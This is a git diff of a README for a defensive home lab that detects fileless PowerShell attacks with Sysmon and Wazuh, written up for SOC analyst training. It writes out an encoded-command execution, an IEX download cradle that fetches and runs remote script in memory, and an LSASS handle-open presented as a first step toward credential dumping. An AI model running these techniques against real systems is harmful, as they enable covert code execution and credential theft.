@@ -1,60 +1,192 @@
 # 🛡️ SOC Project 2: Fileless Attack Detection with Sysmon + Wazuh
 
-![Wazuh](https://img.shields.io/badge/SIEM-Wazuh-blue)
-![Sysmon](https://img.shields.io/badge/Telemetry-Sysmon-orange)
-![MITRE](https://img.shields.io/badge/Framework-MITRE%20ATT%26CK-red)
-![Status](https://img.shields.io/badge/Status-Completed-brightgreen)
+![Wazuh](https://img.shields.io/badge/SIEM-Wazuh-blue?style=for-the-badge&logo=data:image/png;base64,)
+![Sysmon](https://img.shields.io/badge/Telemetry-Sysmon-orange?style=for-the-badge)
+![MITRE](https://img.shields.io/badge/Framework-MITRE%20ATT%26CK-red?style=for-the-badge)
+![Windows](https://img.shields.io/badge/Platform-Windows%2011-0078D6?style=for-the-badge&logo=windows)
+![Status](https://img.shields.io/badge/Status-Completed-brightgreen?style=for-the-badge)
+![Docker](https://img.shields.io/badge/Deployed-Docker%20WSL2-2496ED?style=for-the-badge&logo=docker)
+
+---
 
 ## 📌 Project Overview
-Deployed a detection lab to identify PowerShell-based fileless attacks 
-and Living-off-the-Land (LotL) techniques using Sysmon telemetry forwarded 
-to Wazuh SIEM. Wrote custom detection rules mapped to MITRE ATT&CK framework.
+
+This project simulates real-world **PowerShell-based fileless attacks** and **Living-off-the-Land (LotL)** techniques against a Windows 11 endpoint, then detects them using **Sysmon telemetry** forwarded to a **Wazuh SIEM**. 
+
+The goal is to replicate a Tier 1 SOC analyst workflow: understand the attack, observe the telemetry, triage the alert, and document findings — all mapped to the **MITRE ATT&CK framework**.
+
+> 💡 This is Project 2 in my SOC Analyst home lab series. [View Project 1 → SMB Brute Force Detection](https://github.com/munazajamil/SOC-SMB-Bruteforce-Detection)
+
+---
 
 ## 🏗️ Lab Environment
+
 | Component | Details |
 |-----------|---------|
-| SIEM | Wazuh 4.x (Docker on WSL2) |
-| Endpoint | Windows 11 (Wazuh Agent) |
-| Telemetry | Sysmon with SwiftOnSecurity config |
-| Attack Tools | Native PowerShell (LotL) |
+| **SIEM** | Wazuh 4.x (Docker on WSL2) |
+| **Endpoint Agent** | Windows 11 — Wazuh Agent (windows-host) |
+| **Telemetry Source** | Sysmon with SwiftOnSecurity config |
+| **PS Logging** | Script Block Logging + Module Logging enabled |
+| **Attack Method** | Native PowerShell (Living-off-the-Land) |
+| **Total Alerts Generated** | 1,180 security events |
+
+---
 
 ## ⚔️ Attacks Simulated
-| # | Attack | MITRE ID | Result |
-|---|--------|----------|--------|
-| 1 | Encoded PowerShell Command | T1059.001 | Detected |
-| 2 | Download Cradle (IEX) | T1105 | Blocked + Logged |
-| 3 | LSASS Memory Access | T1003.001 | Detected |
 
-## 🔧 Custom Wazuh Rules Written
-| Rule ID | Description | Level | MITRE |
-|---------|-------------|-------|-------|
-| 100001 | Encoded PowerShell detected | 12 | T1059.001 |
-| 100002 | Download cradle / IEX detected | 13 | T1105 |
-| 100003 | LSASS access detected | 15 | T1003.001 |
-| 100004 | Reverse shell pattern | 14 | T1059.001 |
-| 100005 | Registry persistence | 11 | T1547.001 |
+### Attack 1 — Encoded PowerShell Command `T1059.001`
+Encoded a command string using Base64 and executed it via `-EncodedCommand` flag — a common technique attackers use to **obfuscate malicious commands** from basic security tools.
+
+```powershell
+$command = "whoami; hostname; ipconfig"
+$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
+powershell.exe -EncodedCommand $encoded
+```
+**Result:** Executed successfully. Wazuh detected via Rule 91816 (T1082 — System Information Discovery).
+
+---
+
+### Attack 2 — PowerShell Download Cradle / IEX `T1105`
+Attempted to download and execute a script directly in memory using `IEX` + `Net.WebClient` — the classic **fileless payload delivery** technique that avoids writing anything to disk.
+
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/README.md')
+```
+**Result:** ✅ **Blocked by Windows Defender (AMSI)** — Threat identified as `Trojan:PowerShell/Powersploit.C`, Severity: **Severe**. Logged in Wazuh as Rule 62123 (Level 12).
+
+---
+
+### Attack 3 — LSASS Memory Access `T1003.001`
+Opened a handle to the **LSASS process** (Windows password vault) — simulating the first step of credential dumping tools like Mimikatz.
+
+```powershell
+$lsass = Get-Process lsass
+$handle = [System.Diagnostics.Process]::GetProcessById($lsass.Id)
+Write-Host "Triggered - LSASS PID: $($lsass.Id)"
+```
+**Result:** LSASS PID 1056 accessed. Wazuh detected via Rule 91815 (T1057 — Process Discovery).
+
+---
 
 ## 📊 Detections in Wazuh Dashboard
-![Alerts Dashboard](screenshots/02-alerts-dashboard.png)
-![Custom Rule Firing](screenshots/03-custom-rule-firing.png)
+
+### Security Events Overview
+![Wazuh Security Events Dashboard](screenshots/Wazuh_dashboard.png)
+> 1,180 total alerts generated | 3 High-severity (Level 12+) | 152 authentication events captured
+
+---
+
+### Rule 91815 — PowerShell Process Discovery (T1057)
+![Rule 91815 Alert](screenshots/Security_Events_rule_91815.png)
+> Triggered by Attack 3 (LSASS access). Wazuh captured the exact scriptBlockText showing `Get-Process lsass` command.
+
+---
+
+### Rule 91816 — PowerShell System Info Discovery (T1082)
+![Rule 91816 Alert](screenshots/Security_Events_rule_91816.png)
+> Triggered by Attack 1 (Encoded command). Wazuh captured Event ID 4104 from PowerShell/Operational log channel.
+
+---
+
+### Rule 62123 — Windows Defender: Malware Blocked (Level 12)
+![Rule 62123 Alert](screenshots/Security_Events_rule_62123.png)
+> Triggered by Attack 2 (Download Cradle). Defender identified `Trojan:PowerShell/Powersploit.C` via AMSI scanning. Execution status: **Suspended**.
+
+---
+
+### PowerShell — Attack 2 Blocked by Defender
+![PowerShell Attack Blocked](screenshots/Power_shell_Attacks.png)
+> Real terminal output showing the `ScriptContainedMaliciousContent` block — a defensive layer working as expected.
+
+---
+
+### MITRE ATT&CK Dashboard
+![MITRE ATT&CK Dashboard](screenshots/MITRE_ATTACK_Dashboard.png)
+> Wazuh automatically mapped detected activity to MITRE tactics: Defense Evasion, Discovery, Persistence, Initial Access, Privilege Escalation.
+
+---
 
 ## 🗺️ MITRE ATT&CK Coverage
-![MITRE Mapping](screenshots/05-mitre-mapping.png)
 
-| Technique | ID | Detection Method |
-|-----------|----|-----------------|
-| PowerShell | T1059.001 | Sysmon EID 1 + PS Logging |
-| Tool Transfer | T1105 | Sysmon EID 1 + Defender |
-| Credential Dumping | T1003.001 | Sysmon EID 10 |
-| Persistence | T1547.001 | Sysmon EID 13 |
+See full mapping → [MITRE-mapping.md](MITRE-mapping.md)
 
-## 🛠️ Tools Used
-- Wazuh SIEM, Sysmon, Windows Event Logs
-- PowerShell Script Block Logging
-- MITRE ATT&CK Navigator
+| Technique ID | Technique Name | Attack Simulated | Wazuh Rule | Detected |
+|-------------|---------------|-----------------|------------|----------|
+| T1059.001 | PowerShell | Encoded command execution | 91816 | ✅ |
+| T1105 | Ingress Tool Transfer | IEX download cradle | 62123 | ✅ Blocked |
+| T1003.001 | LSASS Memory Access | Credential dump simulation | 91815 | ✅ |
+| T1057 | Process Discovery | Get-Process lsass | 91815 | ✅ |
+| T1082 | System Info Discovery | whoami/hostname/ipconfig | 91816 | ✅ |
+
+---
+
+## 🔍 Key Findings
+
+- **Fileless techniques work** — Attack 1 and 3 ran without dropping any files to disk, yet Wazuh still captured them through PowerShell Script Block Logging (Event ID 4104)
+- **AMSI is a critical layer** — Windows Defender's AMSI integration blocked Attack 2 at the PowerShell engine level before any payload executed
+- **Script Block Logging reveals obfuscated commands** — even encoded commands get decoded and logged when PS logging is enabled, giving analysts full visibility
+- **Wazuh auto-maps to MITRE** — built-in rules automatically tag alerts with ATT&CK technique IDs, reducing analyst triage time
+
+---
+
+## 🛠️ Tools & Technologies
+
+| Tool | Purpose |
+|------|---------|
+| Wazuh 4.x | SIEM — log collection, alerting, dashboards |
+| Sysmon (SwiftOnSecurity config) | Deep Windows endpoint telemetry |
+| PowerShell Script Block Logging | Captures all PS commands (Event ID 4104) |
+| Windows Defender / AMSI | Endpoint protection layer |
+| Docker + WSL2 | Wazuh deployment environment |
+| MITRE ATT&CK Navigator | Technique mapping |
+
+---
+
+## 📁 Repository Structure
+
+```
+SOC-Sysmon-PowerShell-Detection/
+├── README.md
+├── MITRE-mapping.md
+├── config/
+│   └── sysmon-config.xml
+├── attack-simulations/
+│   ├── 01-encoded-powershell.md
+│   ├── 02-download-cradle.md
+│   └── 03-lsass-access.md
+└── screenshots/
+    ├── Wazuh_dashboard.png
+    ├── MITRE_ATTACK_Dashboard.png
+    ├── Power_shell_Attacks.png
+    ├── Security_Events_rule_91815.png
+    ├── Security_Events_rule_91816.png
+    └── Security_Events_rule_62123.png
+```
+
+---
+
+## 🎯 SOC Analyst Skills Demonstrated
+
+- ✅ SIEM deployment and agent configuration (Wazuh + Windows)
+- ✅ Endpoint telemetry setup (Sysmon + PowerShell logging)
+- ✅ Attack simulation using native OS tools (LotL techniques)
+- ✅ Alert triage and investigation workflow
+- ✅ MITRE ATT&CK framework mapping
+- ✅ Defensive layer validation (AMSI/Defender)
+- ✅ Security event documentation and reporting
+
+---
 
 ## 👩‍💻 Author
+
 **Munnaza Jamil** — Aspiring SOC Analyst  
-[LinkedIn](https://linkedin.com/in/munazajamil) | 
-[TryHackMe](https://tryhackme.com/p/munaza.jamil01) | 
-[GitHub](https://github.com/munazajamil)
+Self-learning cybersecurity | Blue Team focused | Based in Pakistan
+
+[![LinkedIn](https://img.shields.io/badge/LinkedIn-munazajamil-0A66C2?style=flat&logo=linkedin)](https://linkedin.com/in/munazajamil)
+[![TryHackMe](https://img.shields.io/badge/TryHackMe-munaza.jamil01-red?style=flat)](https://tryhackme.com/p/munaza.jamil01)
+[![GitHub](https://img.shields.io/badge/GitHub-munazajamil-181717?style=flat&logo=github)](https://github.com/munazajamil)
+[![Blog](https://img.shields.io/badge/Blog-munazajameel.site-orange?style=flat)](https://munazajameel.site/blog)
+
+---
+
+> 🔗 **Next Project:** [Project 3 — Custom Wazuh Rule Engineering](coming soon)
